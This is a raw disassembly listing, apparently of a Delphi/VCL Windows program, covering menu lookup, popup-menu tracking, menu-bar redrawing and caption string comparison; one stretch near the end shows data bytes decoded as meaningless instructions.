mov eax edi
call sub_4202f4
cmp esi [ edi + 0x48 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor edx edx
mov eax edi
call sub_438378
sub_4383f8
push ebp
mov ebp esp
push esi
xor esi esi
test dl 0x10
je r-xdata
push ecx
push eax
call GetMenuItemID
cmp eax 0xffffffff
je r-xdata
push ecx
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_437a24
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
xor ecx ecx
xchg edx eax
call sub_437a24
mov esi eax
xor eax eax
movzx eax [ ebp + 0x8 ]
mov edx [ esi + 0x30 ]
call sub_43bcdc
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_438454
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x2 ] dx
xor edx edx
push ebp
push sub_43857f
push [ fs : edx ]
mov [ fs : edx ] esp
test [ ebp - 0x2 ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_437a24
mov edi eax
test edi edi
je r-xdata
push esi
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_437a24
mov edi eax
jmp r-xdata
test edi edi
je r-xdata
mov eax edi
call sub_4365a0
cmp esi eax
jge r-xdata
xor ebx ebx
cmp [ edi + 0x30 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_4365b0
mov edi eax
lea eax [ ebp - 0x8 ]
mov edx [ edi + 0x30 ]
movzx edx [ edx ]
call sub_405718
mov esi [ ebp - 0x8 ]
test esi esi
je r-xdata
lea eax [ ebp - 0xc ]
movzx edx [ ebp + 0x8 ]
call sub_405718
mov ebx [ ebp - 0xc ]
test ebx ebx
je r-xdata
sub esi 0x4
mov esi [ esi ]
push ebx
lea eax [ ebp - 0x10 ]
movzx edx [ ebp + 0x8 ]
call sub_405718
mov eax [ ebp - 0x10 ]
call sub_4059dc
push eax
push esi
lea eax [ ebp - 0x14 ]
mov edx [ edi + 0x30 ]
movzx edx [ edx ]
call sub_405718
mov eax [ ebp - 0x14 ]
call sub_4059dc
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
test eax eax
jne r-xdata
sub ebx 0x4
mov ebx [ ebx ]
xor eax eax
lea edx [ ebp - 0x18 ]
mov eax [ edi + 0x30 ]
call sub_439384
cmp [ ebp - 0x18 ] 0x0
sete al
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438586
lea eax [ ebp - 0x18 ]
mov edx 0x5
call sub_405554
retn
mov ebx eax
jmp r-xdata
sub_438594
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebx + 0x8 ]
push eax
call GetMenuItemCount
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0xc ] 0xffffffff
jge r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
movzx eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_4383f8
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp eax 0x3
jne r-xdata
shl eax 0x10
or eax [ ebp - 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] 0xfffffffe
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
shl eax 0x10
or eax [ ebp - 0x14 ]
mov [ ebx + 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] edx
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
movzx eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_438454
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
mov [ ebp - 0x14 ] esi
sub_438710
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_437ba8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push edi
call GetMenuStringA
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push esi
push edi
call GetMenuState
test al 0x10
je r-xdata
push esi
push edi
call GetMenuItemID
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
push edi
call GetSubMenu
mov edi eax
mov cl 0x1
mov edx edi
mov eax ebx
call sub_437a24
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_437a24
mov [ ebp - 0x4 ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_40a950
mov eax [ ebp + 0x10 ]
call sub_40a868
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_4387dc
push ebx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
call sub_44d2f4
test eax eax
je r-xdata
movzx edx [ eax + 0x5f ]
mov eax ebx
call sub_4387b8
mov [ ebx + 0x41 ] 0x1
sub_438804
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_404800
movzx edx [ eax + 0x5f ]
mov eax ebx
call sub_4387b8
mov [ ebx + 0x41 ] 0x1
sub_438898
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
movzx eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_438330
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax edi
call sub_4381b4
mov ebx eax
test esi esi
jne r-xdata
test bl bl
je r-xdata
push 0x0
push 0x0
push 0xb015
mov eax [ edi + 0x38 ]
push eax
call SendMessageA
mov eax [ edi + 0x38 ]
push eax
call DrawMenuBar
sub_43892c
push ebx
push esi
mov ebx eax
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb015
push eax
call SendMessageA
sub_438968
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_438992
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4389b4
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_438ee8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x111
jg r-xdata
sub eax 0x117
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x2b
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
inc ebx
xor edi edi
mov [ ebp - 0xd ] 0x0
test [ esi + 0x6 ] 0x10
je r-xdata
dec eax
je r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438eef
lea eax [ ebp - 0x30 ]
call sub_405530
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x27
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_419898
mov edx [ esi + 0x4 ]
call sub_437ae0
test al al
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_4470d4
jmp r-xdata
inc ebx
xor edi edi
inc ebx
xor edi edi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_419898
movzx edx [ esi + 0x4 ]
call sub_437ac4
test al al
jne r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_425108
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_438d1b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_438cfe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_42579c
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_425630
mov eax [ ebp - 0x24 ]
movzx eax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x24 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_4391ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438d05
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_42579c
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
movzx eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x2c ]
call sub_438594
jmp r-xdata
mov edx [ esi + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x2c ]
call sub_437a24
test eax eax
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_419898
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_437a24
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call GetWindowDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_438e5e
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_425108
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_438e39
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_438e1c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_42579c
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_425630
mov eax [ ebp - 0x28 ]
add eax 0x10
push eax
mov eax [ ebp - 0x28 ]
lea ecx [ eax + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438e23
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_42579c
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x58 ]
call sub_44d5a8
mov edx [ ebp - 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4470d4
jmp r-xdata
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
movzx edx [ esi + 0x4 ]
push edx
push eax
call GetSubMenu
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_419898
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_437a24
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_419898
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
mov cl 0x1
call sub_437a24
mov [ ebp - 0xc ] eax
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_419898
mov eax [ eax + 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_419898
movzx ecx [ ebp - 0xd ]
mov edx [ ebp - 0x8 ]
call sub_437a24
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_419898
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x34 ]
cmp eax [ esi + 0x8 ]
je r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_419898
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0x8 ]
mov cl 0x1
call sub_437a54
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_419898
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx [ ebp - 0x20 ]
cmp eax [ edx + 0xc ]
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x6c ]
test edx edx
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_419898
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
xor ecx ecx
call sub_437a54
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test [ edx + 0x270 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ edx + 0x160 ]
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_446d0c
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx eax
mov eax 0x8
xchg edx eax
call sub_446d94
jmp r-xdata
sub_438e40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call ReleaseDC
retn
sub_438ef8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_419740
pop esi
pop ebx
retn
push ebx
push sub_438968
call sub_421140
mov [ ebx + 0x10 ] eax
sub_438f3c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43782c
mov [ esi + 0x58 ] 0xffffffff
mov [ esi + 0x5c ] 0xffffffff
mov eax [ esi + 0x34 ]
mov [ eax + 0x8c ] esi
mov edx [ esi ]
mov edx [ edx + 0x3c ]
mov [ eax + 0x88 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x38 ] eax
mov [ esi + 0x61 ] 0x1
mov edx esi
mov eax [ rw-data ]
call sub_438ef8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax esi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_438fb0
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_438f20
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4378d8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_439008
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x41 ] 0x0
je r-xdata
lea eax [ ebx + 0x58 ]
call sub_433a58
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
movzx edx [ eax + 0x34 ]
mov eax ebx
call sub_4387b8
mov [ ebx + 0x41 ] 0x1
movzx edx [ eax + 0x5f ]
mov eax ebx
call sub_4387b8
mov [ ebx + 0x41 ] 0x1
jmp r-xdata
sub_439054
push esi
xor edx edx
mov ecx [ rw-data ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov eax edx
pop esi
retn
cmp [ eax + 0x41 ] 0x0
je r-xdata
cmp [ eax + 0x30 ] 0x1
sete dl
add eax 0x58
call sub_433a58
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_445768
mov edx eax
jmp r-xdata
mov si 0xffc7
call sub_40484c
mov edx eax
jmp r-xdata
sub_4390a0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov ecx esp
mov edx edi
mov eax esi
call sub_418420
mov edx esp
mov eax ebx
call sub_439150
mov eax ebx
call sub_439008
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_43718c
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_437674
mov eax [ ebx + 0x34 ]
call sub_434924
mov eax ebx
call sub_438248
mov eax ebx
call sub_439054
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 2 + rw-data ]
movzx edx [ ebx + 0x60 ]
movzx ebp [ eax + edx * 2 ]
movzx eax [ ebx + 0x68 ]
or bp [ eax * 2 + rw-data ]
movzx ebp bp
movzx eax [ ebx + 0x69 ]
shl eax 0xa
or ebp eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
push eax
push 0x0
push edi
push esi
push ebp
mov eax [ ebx + 0x34 ]
call sub_434a54
push eax
call TrackPopupMenu
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_439150
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edx [ esp ]
mov [ eax + 0x58 ] edx
mov edx [ esp + 0x4 ]
mov [ eax + 0x5c ] edx
pop ecx
pop edx
pop edi
pop esi
retn
sub_439170
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_419898
xor edx edx
mov [ eax ] edx
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_419898
cmp ebp [ eax ]
jne r-xdata
sub_4391ac
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x15 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov bl 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jg r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_424fb8
mov edx 0xff000007
mov eax [ edi + 0xc ]
call sub_4246fc
test [ ebp + 0x8 ] 0x80
je r-xdata
mov edx 0xff00000d
mov eax [ edi + 0x14 ]
call sub_424fb8
mov edx 0xff00000e
mov eax [ edi + 0xc ]
call sub_4246fc
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xfff2
call sub_40484c
mov edx [ r-xdata ]
call sub_4047dc
mov [ ebp - 0x5 ] al
test [ ebp + 0x8 ] 0x1
je r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_424fb8
mov edx 0xff000011
mov eax [ edi + 0xc ]
call sub_4246fc
jmp r-xdata
movzx eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x5 ]
push eax
lea ecx [ ebp - 0x15 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test bl bl
jne r-xdata
sub_439294
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_405584
mov edi 0x1
jmp r-xdata
mov eax [ esi ]
call sub_40580c
cmp edi eax
jle r-xdata
mov eax [ esi ]
movzx eax [ eax + edi - 0x1 ]
mov edx [ rw-data ]
movzx eax al
bt [ edx ] eax
jae r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
cmp [ eax + edi - 0x1 ] 0x26
jne r-xdata
inc edi
jmp r-xdata
inc edi
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor ebx ebx
cmp edi 0x1
jle r-xdata
mov eax esi
mov ecx 0x1
mov edx edi
call sub_405a84
mov edx edi
dec edx
mov eax esi
mov ecx 0x4
call sub_405a84
jmp r-xdata
mov [ esp + 0x4 ] 0x0
mov eax [ esi ]
mov [ esp ] eax
mov ebp [ esp ]
test ebp ebp
je r-xdata
mov [ esp + 0x5 ] 0x0
mov eax [ esi ]
cmp [ eax + edi - 0x2 ] 0x28
sete [ esp + 0x5 ]
jmp r-xdata
sub ebp edi
cmp ebp 0x2
setge [ esp + 0x4 ]
jmp r-xdata
sub ebp 0x4
mov ebp [ ebp ]
mov [ esp + 0x6 ] 0x0
mov eax [ esi ]
cmp [ eax + edi + 0x1 ] 0x29
sete [ esp + 0x6 ]
jmp r-xdata
cmp [ esp + 0x5 ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
test bl bl
je r-xdata
movzx ebx [ esp + 0x6 ]
jmp r-xdata
sub_439384
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax ebp
call sub_405530
mov ebx 0x1
mov eax esi
test eax eax
je r-xdata
mov edi eax
cmp edi ebx
jl r-xdata
sub eax 0x4
mov eax [ eax ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
movzx edx [ esi + ebx - 0x1 ]
movzx edx dl
bt [ eax ] edx
jae r-xdata
cmp [ esi + ebx - 0x1 ] 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
cmp edi ebx
jge r-xdata
mov eax edi
sub eax ebx
dec eax
jl r-xdata
inc ebx
cmp [ esi + ebx - 0x1 ] 0x26
je r-xdata
mov eax ebp
movzx edx [ esi + ebx - 0x1 ]
call sub_405718
sub_4393ec
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43948f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_439294
mov edi [ ebp - 0x8 ]
lea edx [ ebp - 0xc ]
mov eax esi
call sub_439294
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x10 ] edi
mov ebx [ ebp - 0x10 ]
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
push esi
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
push ebx
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x10 ]
call sub_4059dc
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439496
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_405554
retn
sub esi 0x4
mov esi [ esi ]
sub_4394a0
adc al [ eax ]
add [ eax ] al
and al 0x49
add [ eax + ecx * 2 + 0x24600049 ] bl
dec ecx
add [ eax + 0x48 ] dl
dec ecx
add [ esp + 0x49 ] bl
add al dh
inc edi
dec ecx
add [ eax + 0x24 ] bl
dec ecx
add [ eax + ecx * 2 ] ah
dec ecx
add [ esp + 0x49 ] dl
add ah bl
dec ebx
dec ecx
add [ eax + 0x24 ] dl
dec ecx
add [ eax + ecx * 2 ] ch
dec ecx
add [ esp + 0x49 ] cl
add [ edx + ecx * 2 ] cl
dec ecx
add [ eax + 0x24 ] cl
dec ecx
add [ eax + 0x49 ] ah
dec ecx
add [ esp + 0x49 ] al
add [ esp + ecx * 2 + 0x24400049 ] cl
dec ecx
add [ eax + 0x3c00494c ] cl
and al 0x49
add [ eax ] cl
dec ecx
dec ecx
add [ eax ] bh
and al 0x49
add [ esp + ecx * 2 ] dh
dec ecx
add [ esp ] dh
dec ecx
add al ch
dec ebx
dec ecx
add [ eax ] dh
and al 0x49
add ah dh
dec esp
dec ecx
add [ esp ] ch
dec ecx
add [ esp + ecx * 2 + 0x24280049 ] dh
dec ecx
add [ ecx + ecx * 2 ] bl
dec ecx
add [ esp ] ah
dec ecx
add [ ecx + ecx * 2 ] dh
dec ecx
add [ eax ] ah
and al 0x49
add [ eax + 0x55004949 ] al
mov ebp esp
xor eax eax
push ebp
push sub_439598
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43959f
retn
mov eax [ rw-data ]
call sub_404650
mov eax [ rw-data ]
call sub_404650
mov eax [ rw-data ]
call sub_404650
mov eax rw-data
call sub_405530
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
